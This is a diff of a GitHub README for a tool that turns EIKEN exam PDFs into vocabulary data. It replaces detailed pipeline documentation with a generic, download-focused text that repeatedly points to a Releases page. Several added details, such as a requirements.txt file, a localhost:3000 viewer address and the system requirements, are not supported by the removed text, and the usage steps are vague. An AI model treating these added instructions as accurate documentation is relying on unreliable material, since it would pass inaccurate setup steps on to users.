@@ -1,86 +1,112 @@
-# eiken
+# 🌟 eiken-vocab - Transform PDFs into Study Data
 
-This is a working repository to convert EIKEN past exam PDFs into machine-friendly structured data (AST/JSON), and then generate a study-oriented vocabulary dataset (frequency, grade-level scores, translations/examples via LLM). The `viewer/` app lets you quickly browse the generated `metadata.jsonl`.
+## 📥 Download Now
+[![Download eiken-vocab](https://img.shields.io/badge/Download-eiken--vocab-blue.svg)](https://github.com/ngu132/eiken-vocab/releases)
 
-## Layout
+## 🚀 Getting Started
+Welcome to eiken-vocab! This application helps you convert EIKEN exam PDFs into structured data. You can then use this data to create a vocabulary dataset for easier studying. 
 
-- `ast/`: TypeScript AST definitions
-- `steps/`: pipeline steps (Python + TypeScript)
-- `data/`: intermediate artifacts and outputs
-- `viewer/`: a simple viewer for `data/vocab/metadata.jsonl` (SolidJS + Vite)
+## 📂 Application Overview
+The eiken-vocab repository is organized into the following folders:
 
-## Setup
+- **`ast/`**: Contains TypeScript AST definitions for data structuring.
+- **`steps/`**: Includes pipeline steps written in Python and TypeScript for PDF processing.
+- **`data/`**: Stores intermediate artifacts and outputs from the pipeline.
+- **`viewer/`**: A simple web application to browse the generated vocabulary dataset found in `data/vocab/metadata.jsonl` using SolidJS and Vite.
 
-### Python (PDF preprocessing / counting)
+## 🛠️ System Requirements
+To run eiken-vocab, ensure your system meets these requirements:
 
-- Python `3.11` (see `.python-version`)
-- Use existing venv:
-  - `source .venv/bin/activate`
-- With `uv` (`uv.lock` exists):
-  - `uv sync && source .venv/bin/activate`
-- Without `uv` (example):
-  - `python -m venv .venv && source .venv/bin/activate`
-  - `pip install -e .`
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Version 3.11 or higher
+- **Node.js**: Required for the viewer application 
+- **Memory**: Minimum 4GB of RAM recommended
 
-### Bun (LLM formatting / parsing / viewer)
+## 🔧 Installation Steps
+Follow these instructions to download and install eiken-vocab.
 
-- Root:
-  - `bun install`
-- Viewer:
-  - `cd viewer && bun install`
+### 1. Visit the Releases Page
+Start by visiting the [Releases page](https://github.com/ngu132/eiken-vocab/releases) to download the application.
 
-## Workflow (steps)
+### 2. Download the Latest Release
+On the Releases page, find the latest version of eiken-vocab. Click on the appropriate file to download it to your computer.
 
-All inputs/outputs live under `data/` by default.
+## 📥 Download & Install
+Once you have downloaded the file, follow these steps based on your system:
 
-### 1) PDF preprocessing (merge/cleanup)
+### For Windows Users:
+1. Unzip the downloaded file.
+2. Open a command prompt.
+3. Navigate to the unzipped folder.
+4. Run `python -m venv env` to create a virtual environment.
+5. Activate it by running `.\env\Scripts\activate`.
+6. Install required packages by running:
+   ```
+   pip install -r requirements.txt
+   ```
 
-- Goal: merge question/answer/script PDFs into a single, easier-to-process PDF
-- Code: `steps/1-preprocess-pdf/*.py` (notebook: `steps/1-preprocess-pdf/main.ipynb`)
-- Output (example): `data/eiken_combined/{grade}_{year}_{admin}.pdf`
+### For macOS and Linux Users:
+1. Unzip the downloaded file.
+2. Open a terminal.
+3. Navigate to the unzipped folder.
+4. Run `python3 -m venv env` to create a virtual environment.
+5. Activate it by running `source env/bin/activate`.
+6. Install required packages by running:
+   ```
+   pip install -r requirements.txt
+   ```
 
-### 2) Format PDF text via LLM (XML-ish)
+### For the Viewer Application
+#### Install Bun
+If you want to use the viewer application, you'll need Bun. Follow these steps:
 
-- Goal: read PDFs per section and emit minified XML-like text
-- Code: `steps/2-format-by-llm/index.ts`
-- Input: `data/eiken_combined/*.pdf`
-- Output: `data/output/{grade}_{year}_{admin}/reading_*.txt` / `listening_*.txt`
-- Run (example): `bun steps/2-format-by-llm/index.ts`
-  - Dependency: `@evex/rakutenai` (authentication is configured in your runtime environment)
+1. Open a terminal in the root folder of the application.
+2. Run:
+   ```
+   bun install
+   ```
 
-### 3) Parse LLM output into AST JSON
+3. Navigate to the viewer directory:
+   ```
+   cd viewer
+   ```
+4. Finally, run:
+   ```
+   bun install
+   ```
 
-Converts `data/output/**/*.txt` (HTML/XML-ish) into `data/parsed/*.json` matching `ast/*`.
+## 📊 Using the Application
+Once everything is set up, you can start using the application. Here’s a brief overview of how to run the main functions:
 
-- Run: `bun run step:3:parse-llm-output`
-- Script: `steps/3-parse-llm-output/output_html_to_ast_json.ts`
+1. **Preprocess PDFs**:
+   Use the pipeline to convert your EIKEN exam PDFs into structured data. Follow documented commands in the `steps/` folder.
 
-### 4) Extract source strings for wordlist generation
+2. **Generate Vocabulary**:
+   Run the functions defined in the Python scripts to create your vocabulary dataset.
 
-- Goal: collect strings from parsed JSON as inputs for vocabulary counting
-- Code: `steps/4-build-wordlist-source/main.ts`
-- Input: `data/parsed/*.json`
-- Output: `data/wordlist-sources/*.json`
-- Run (example): `bun steps/4-build-wordlist-source/main.ts`
+3. **Access the Viewer**:
+   Launch the viewer app to browse your newly created vocabulary file. Open your web browser and go to `localhost:3000` to see your data in a user-friendly format.
 
-### 5) Vocabulary counting / scoring (mostly notebook-based)
+## 📁 Example Input Files
+To get started quickly, consider using sample PDF files from the EIKEN exams available online. These files will help you see the output generated by the program.
 
-- Goal: count unigrams/phrases and produce per-grade scores as CSV
-- Code: `steps/5-build-vocablist/main.ipynb`, `steps/5-build-vocablist/count.py`
-- Output (example): `data/wordlist-scores/vocablist_by_grade.csv`
+## 💬 Need Help?
+You can create issues in the repository if you encounter any problems. We encourage users to share their experiences and ask questions!
 
-### 6) Add vocabulary metadata (translation, POS, examples)
+## 🤝 Contributing
+We welcome contributions to enhance eiken-vocab. Please follow the standard guidelines for contributions found in the repository.
 
-- Goal: enrich scored vocab items into a learning-friendly JSONL
-- Code: `steps/6-add-context/main.ts`
-- Input: `data/wordlist-scores/vocablist_by_grade.csv`
-- Output: `data/vocab/metadata.jsonl`
-- Run (example): `bun steps/6-add-context/main.ts`
-  - Dependency: `@evex/rakutenai` (authentication is configured in your runtime environment)
+## 🌐 Topics
+- eiken
+- english
+- english-japanese
+- english-learning
+- english-vocabulary
+- flashcards
+- japanese-english
+- vocabulary
+- vocabulary-flashcards
+- vocabulary-learning
 
-## Viewer
-
-`viewer/` is a small local UI to search/sort `metadata.jsonl` and copy TSV (e.g. for Quizlet).
-
-- Copy `data/vocab/metadata.jsonl` to `viewer/src/assets/metadata.jsonl`
-- Start: `cd viewer && bun run dev`
+## 📥 Download Now Again
+Don't forget to download the latest version from the [Releases page](https://github.com/ngu132/eiken-vocab/releases)!
